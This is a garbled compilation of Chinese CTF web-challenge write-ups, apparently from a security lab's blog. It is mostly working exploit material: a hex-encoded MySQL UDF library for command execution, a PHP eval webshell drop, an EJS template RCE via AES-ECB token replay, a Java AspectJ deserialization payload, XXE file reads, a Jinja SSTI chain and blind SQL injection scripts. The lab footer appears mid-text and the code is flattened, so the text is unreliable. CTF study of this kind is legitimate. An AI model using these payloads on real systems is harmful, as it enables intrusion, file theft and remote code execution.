488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';create function sys_eval returns string soname 'udf.so';select sys_eval('/readflag');

07

Bluebluesky

弱口令123456登录后台。

发现1day的点都被修复了，包括 unserialize 和 插件的代码都被注释了。

一处可以执行代码的点：

/index.php?s=/admin/setting/test_php

_usertoken_=757a471d62503d6361bc7147796c40c6&_check_pwd_=123456

php=php$IFS-r$IFS"file_put_contents('/var/www/html/runtime/a.php','<?=eval($_REQUEST[123]);?>');";

08

web-hack 题解

拿到题目可以发现其实后端的代码并不复杂，index.cjs 中仅有两个接口，一个 websocket，一个 render：

websocket

跟进到 ws.mjs 中可以看到本题所有的接口都是通过 AES ECB 来进行身份验证的，或许可以考虑 ECB 重放攻击，但是现在似乎并不能直接使用，mark 一下。

继续看代码可以发现 profilePayload 接口有个很奇怪的东西：

都不用原型链污染了，真贴心，但是我们并不能控制 debug 属性，仍然 mark，后面会用到

render

一来就是一个非常显眼的注释：

可以看到给了一个过期的 token，但是这道题是基于 AES ECB 的，不妨把数据对齐看看能不能重放：

很明显最后两块是可以利用的，加上前面 websocket 的 profilePayload 接口我们可以往里面加任意属性，控制一下长度就可以构造 debug == true 了。

继续往后面看：

这一段代码乍一看似乎没什么问题，但是短短几行代码就隐藏了两个 bug：

换行缺少分号

在 data 复制的地方可以看到第一行是没有分号的，代码本意是第一行将 data 赋值为一个数组，第二行通过布尔判断截断的方式打印提示，但是因为缺少分号，并且紧接的第二行是以 [ 开头，这就会导致第二行的 [decrypted.debug ? 0 : 1] 变成第一行的取下标操作，最后 data 变量的值就会变成一个对象，而结合前面 decrypted.debug 已经可控，我们就可以控制让 data 变量被赋值为 decrypted 的值。

if 代码块内无 return

由于在前面写死了 const env = ‘production’; ，所以在这里检测 env === ‘production’ 的时候虽然似乎乍一看无解了，但是由于这里执行完成之后并没有 return，后面的代码其实还是会继续运行，也就是说 data 会被传入 res.render 函数进行渲染，而 data 变量可控，这就是一个很简单的 ejs rce了。

exp

import base64import jsonimport reimport requestsfrom websockets.sync.client import connect
endpoint = "http://192.168.88.128:
3000"ws_endpoint = "ws://192.168.88.128:
3000"
# test token
# {"iat":
150000000
# 0000,"exp":
15999
# 99999999,"name":# "ciscn","debug":# true}
# exp token
# {"iat":
16xxxxxxx
# xxxx,"exp":
16xxx
# xxxxxxxx,"name":# "exp","achieveme
# nts":[],"setting
# s":{"view option
# s":{"client":1,"# escapeFunction":# "0;
return proces
# s.mainModule.con
# structor._load('# child_process').# execSync('/readf
# lag>>statics/ind
# ex.html')"}},"a_
# super_long_str":# "ciscn","debug":# true}
test_token = base64.b64decode("IK8FyUzqb7xjrpWnphEEY5d9814rMICbbGJxKM9Hy/niR0R00mHAoUfxp+5lYU7Pd5nXqPPBP9xlWPERsTe16jJnXLb9hYQ3PQbkkOUr8pA=")
with connect(ws_endpoint) as ws: ws.send(json.dumps({ "type": "login", "id": "exp", "data": { "username": "exp", "password": "exp", }, })) token = json.loads(ws.recv())["data"]["token"] ws.send(json.dumps({ "type": "profilePayload", "id": "exp", "data": { "token": token, "payload": { "settings": { "view options": { "client": 1, "escapeFunction": "0;
return process.mainModule.constructor._load('child_process').execSync('/readflag>>statics/index.html')" }, }, "a_super_long_str": "some_random_sting_just_to_make_sure_the_payload_is_long_enough_and_will_be_replaced_anyway", }, }, })) payload = base64.b64decode(json.loads(ws.recv())["data"]["token"]) payload = payload[:16 * 16] + test_token[16 * 3:] payload = base64.b64encode(payload).decode()requests.get(endpoint + "/profile", params={"token": payload})print(re.search(r'flag{.*}', requests.get(endpoint + "/").text).group())

往期回顾

EnemyBot简单分析

Havoc-win

绕过W*S-WAF的MSSQL注入

扫码关注我们

天虞实验室为赛宁网安旗下专业技术团队，重点攻关公司业务相关信息安全前沿技术。


```
package com.example.ctf;

import com.example.ctf.bean.UserBean;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
public class Test2 { public static void unserialize(byte[] bytes) throws Exception{ try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes); ObjectInputStream oin = new ObjectInputStream(bain)){ oin.readObject(); } }
 public static byte[] serialize(Object o) throws Exception{ try(ByteArrayOutputStream baout = new ByteArrayOutputStream(); ObjectOutputStream oout = new ObjectOutputStream(baout)){ oout.writeObject(o); return baout.toByteArray(); } } public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldname); field.setAccessible(true); field.set(obj,value); } public static void main(String[] args) throws Exception {
 Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"); Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class); declaredConstructor.setAccessible(true); HashMap map = (HashMap)declaredConstructor.newInstance("/tmp/data/", 123); String payload1 = readFileToString("/tmp/data/exp.tar"); UserBean ub = new UserBean("exp.tar",payload1); setFieldValue(ub, "obj", map); byte[] bytes = serialize(ub); byte[] payload = Base64.getEncoder().encode(bytes); System.out.println(new String(payload)); }

 public static String readFileToString(String fileName) { Path filePath = Paths.get(fileName); try { byte[] bytes = Files.readAllBytes(filePath); return new String(bytes, StandardCharsets.UTF_8); } catch (IOException e) { e.printStackTrace(); } return null; }}
postbase64=rO0ABXNyAB1jb20uZXhhbXBsZS5jdGYuYmVhbi5Vc2VyQmVhbpRg5pPhAcY4AgADT
AADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABTAADb2JqdAASTGphdmEvbGFuZ
y9PYmplY3Q7eHB0C6RleHDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgDAwMDc1NSDAgDAwMDc2NSDAg
DAwMDAwMCDAgDAwMDAwMDAwMDAwIDE0NDMyMzUxMTM0IDAxMzAxNMCAIDIvZmxhZ8CAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIB1c3RhcsCAMDBmbXl5ecCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgHdoZWVswIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAMDAwMDAwIMCAMDAwMDAwIMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAdAAHZXhwLnRhcnNyAD5vcmcuYXNwZWN0ai53Z
WF2ZXIudG9vbHMuY2FjaGUuU2ltcGxlQ2FjaGUkU3RvcmVhYmxlQ2FjaGluZ01hcDurAh9LalZaA
gADSgAKbGFzdFN0b3JlZEkADHN0b3JpbmdUaW1lckwABmZvbGRlcnEAfgABeHIAEWphdmEudXRpb
C5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIA
AAAEAAAAAB4AAABiD1d8TUAAAB7dAAKL3RtcC9kYXRhLw==
Posttype=2&tarFilename=/tmp/data/exp.tar
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag"> ]> &xxe; 123
/register.php?username=aaa&password=aaa&user_xml_format=%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%0a%20%20%20%20%20%20%20%20%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%0a%20%20%20%20%20%20%20%20%5d%3e%0a%3c%75%73%65%72%69%6e%66%6f%3e%0a%3c%75%73%65%72%3e%0a%20%20%20%20%3c%75%73%65%72%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%75%73%65%72%6e%61%6d%65%3e%0a%20%20%20%20%3c%70%61%73%73%77%6f%72%64%3e%31%32%33%3c%2f%70%61%73%73%77%6f%72%64%3e%0a%3c%2f%75%73%65%72%3e%0a%3c%2f%75%73%65%72%69%6e%66%6f%3e
/login.php?username=aaa&password=wrong_password
{ "username":"123", "note":"payload"}
import requests

def ssti(payload, username): burp0_url = "http://127.0.0.1:
21111/note/" burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
103.0) Gecko/20100101 Firefox/103.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"} burp0_json={"note": "{%endraw%}"+payload+"{%raw%}", "userid": username } a = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)def show(username): burp1_url = "http://127.0.0.1:
21111/note/"+username burp1_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
103.0) Gecko/20100101 Firefox/103.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"} b = requests.get(burp1_url, headers=burp1_headers) print(b.text)
ssti("{%print(d('cat /flag').read())%}","payl5")ssti("{%set d=c.os.popen%}{%include 'payl5.html'%}","payl4")ssti("{%set c=b.__globals__%}{%include 'payl4.html'%}","payl3")ssti("{%set b=a.__init__%}{%include 'payl3.html'%}","payl2")ssti("{%set a=joiner%}{%include 'payl2.html'%}", "payl1")show("payl1")
<?phpshow_source(__FILE__);error_reporting(0);class MySQL{ public $conn = null; protected $config = array( "dsn" => "mysql:
host=localhost:
3306;dbname=?", "username" => "wow", "password" => "wow123" ); public function __construct(){ $this->conn = new PDO($this->config['dsn'], $this->config['username'], $this->config['password']); }}class Resume{ public $name; public $sql; public $stmt; public $id; public $data = array(); public $conn = null; public function __construct(){ $mysql = new MySQL(); $this->conn = $mysql->conn; } public function show(){ try { $sql = 'select * from articles;'; $stmt = $this->conn->prepare($sql); $stmt->execute(); while ($row = $stmt->fetch(PDO::
FETCH_BOTH)) { $this->data[] = $row; } $this->conn = null; return $this->data; } catch (Exception $e) { $this->conn = null; } } public function query($title){ try { $sql = " SELECT * FROM `articles` WHERE `title` LIKE :
name "; $stmt=$this->conn->prepare($sql); $stmt->bindValue(':
name', '%'.$title.'%', PDO::
PARAM_STR); $stmt->execute(); $row = $stmt->fetchAll(PDO::
FETCH_ASSOC); $this->conn = null; return $row; } catch (Exception $e) { $this->conn = null; } }}class AAA { public $name; public $sql; public $stmt; public $id; public $data = array(); public $conn = null; public function __construct(){ $mysql = new MySQL(); $this->conn = $mysql->conn; } public function query($title){ $sql = "SELECT * FROM `articles` WHERE `title` LIKE '%' '".$title."' '%';"; if (preg_match('/b(???)b/i',$title)) { die('hack!'); } $stmt = $this->conn->query($sql); $this->conn = null; }}class BBB{ protected $a; protected $func; public function __toString(){ $b = $this->a; return (string)$b(); }}class CCC{ public $a; public $b; public $c; public function __invoke(){ if(($this->a != $this->b) && (md5($this->a) == md5($this->b))){ $func = new AAA(); $func->query($this->c); } }}class DDD{ public $a; public function func($checksec){ if ($checksec == 0) { return 'NOPE'; } return 'OK'; } public function __set($name, $value){ $this->$name = $this->a; echo $this->a; }}
class EEE{ public $a; public $b; public function __call($name, $argc){ $this->b->func = $argc[0]; } public function calculate($arg1, $arg2){ $c = $arg1 + $arg2; return $c; } public function __wakeup(){ $this->a->helloworld = $this->b; }}unserialize($_POST['sql']);
EEE:
__wakeup()->DDD:
__set()->BBB:
__toString()->Nanahira:
__invoke()->AAA:
query()
<?phpshow_source(__FILE__);error_reporting(0);class AAA { public $name; public $sql; public $stmt; public $id; public $data = array(); public $conn = null;}class BBB{ public $a; public $func;}class CCC{ public $a; public $b; public $c;}class DDD{ public $a;}
class EEE{ public $a; public $b;}$a = new EEE();$b = new DDD();$b1 = new DDD();$c = new BBB();$a->a = $b;$b->a = $c;$d = new CCC();$c->a = $d;$c->func = $c1;$e = new AAA();$d->a = 'QLTHNDT';$d->b = 'EEIZDOI';// 查所有数据库$d->c = '1''%';select/**/if((ord(substr((select group_concat(distinct/**/table_schema)/**/from information_schema.columns),1,1))=114),sleep(3),1)#';// 查数据库里的表$d->c = '1''%';select/**/if((ord(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/as/**/test/**/where/**/table_schema=0x726573756d65),1,1))=97),sleep(3),1)#';// 查数据库里的字段$d->c = '1''%';select/**/if((ord(substr((select group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x61727469636c6573),1,1))=91),sleep(3),1)#';// 查数据库里的数据$d->c = '1''%';select/**/if((ord(substr((select/**/the_field_of_this_flag_is_not_very_long_ha_ha_ha_ha_ha_ha/**/from/**/ctftraining.flag/**/limit/**/3,4),1,1))=102),sleep(3),1)#';// echo urlencode(serialize($a));
echo urlencode(serialize($a));
import requests,time,os,datetime
def exp(ip, i, j): global length length = 0 req = requests.Session() url = ip + "/controller/controller.php" if (i < 10) and (j >= 10 and j <= 99): length = 167 elif (i < 10) and (j > 100 and j <= 127): length = 168 elif (i >= 10 and i <= 99) and (j >= 10 and j <= 99): length = 168 elif (i >= 10 and i <= 99) and (j >= 100 and j <= 127): length = 169 headers = { "X-Forwarded-For": "127.0.0.1" } payload = {"sql": "O:3:"EEE":2:{s:1:"a";O:3:"DDD":1:{s:1:"a";O:3:"BBB":2:{s:1:"a";O:3:"CCC":3:{s:1:"a";s:7:"QLTHNDT";s:1:"b";s:7:"EEIZDOI";s:1:"c";s:
168:"1''%';select/**/if((ord(substr((select/**/the_field_of_this_flag_is_not_very_long_ha_ha_ha_ha_ha_ha/**/from/**/ctftraining.flag/**/limit/**/3,4),"+str(i)+",1))="+str(j)+"),sleep(3),1)#";}s:4:"func";N;}}s:1:"b";N;}"} time1 = datetime.datetime.now() req = req.post(url, data=payload, headers=headers) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec >= 2: return True else: return Falseflag = ""for i in range(1,127): for j in range(32,127): if(exp('http://192.168.233.1:
8081', i,j)): flag += chr(j) os.system("cls") print(flag)
import requests,time,os,datetime
def exp(ip, i, j): global length length = 0 req = requests.Session() url = ip + "/controller/controller.php" if (i < 10) and (j >= 10 and j <= 99): length = 142 elif (i < 10) and (j > 100 and j <= 127): length = 143 elif (i >= 10 and i <= 99) and (j >= 10 and j <= 99): length = 143 elif (i >= 10 and i <= 99) and (j >= 100 and j <= 127): length = 144 headers = { "X-Forwarded-For": "127.0.0.1" } payload = {"sql": "O:3:"EEE":2:{s:1:"a";O:3:"DDD":1:{s:1:"a";O:3:"BBB":2:{s:1:"a";O:3:"CCC":3:{s:1:"a";s:7:"QLTHNDT";s:1:"b";s:7:"EEIZDOI";s:1:"c";s:"+str(length)+":"1''%';select/**/if((ord(substr((select/**/group_concat(distinct/**/table_schema)/**/from/**/information_schema.columns),"+str(i)+",1))="+str(j)+"),sleep(3),1)#";}s:4:"func";N;}}s:1:"b";N;}"} time1 = datetime.datetime.now() req = req.post(url, data=payload, headers=headers) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec >= 2: return True else: return Falseflag = ""for i in range(1,127): for j in range(32,127): if(exp('http://127.0.0.1:
8081', i,j)): flag += chr(j) os.system("cls") print(flag)
['message', 'listdir', 'self','url_for','_','"',"os","read","cat","more", "`", "[", "]", "class", "config", "+", "eval", "exec", "join", "import", "popen", "system", "header", "arg", "form", "os", "read", "write", "flag", "ls", "ll", "sort", "nl", " ", ";", ":", "\"]
import requestsimport re
